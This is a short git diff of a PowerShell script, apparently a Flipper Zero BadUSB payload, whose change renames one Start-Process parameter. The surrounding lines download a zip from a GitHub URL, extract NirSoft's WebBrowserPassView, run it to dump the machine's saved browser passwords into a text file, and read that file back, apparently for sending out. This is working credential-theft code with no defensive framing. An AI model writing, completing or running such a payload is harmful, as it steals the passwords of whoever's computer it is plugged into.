@@ -13,7 +13,7 @@ Invoke-WebRequest -Headers $headers -Uri https://github.com/Agente404/flipper/ra
 Expand-Archive "wbpv.zip" -DestinationPath "wbpv" -Force | Wait-Process;
 Remove-Item "wbpv.zip" -Force;
 
-Start-Process -FilePath "wbpv\WebBrowserPassView.exe" -Args "/stext wbpv\pwd.txt" -Wait;
+Start-Process -FilePath "wbpv\WebBrowserPassView.exe" -ArgumentList "/stext wbpv\pwd.txt" -Wait;
 
 $fileBytes = [System.IO.File]::ReadAllBytes("$env:temp\wbpv\pwd.txt");
 $fileContent =  [System.Text.Encoding]::GetEncoding("UTF-8").GetString($fileBytes);
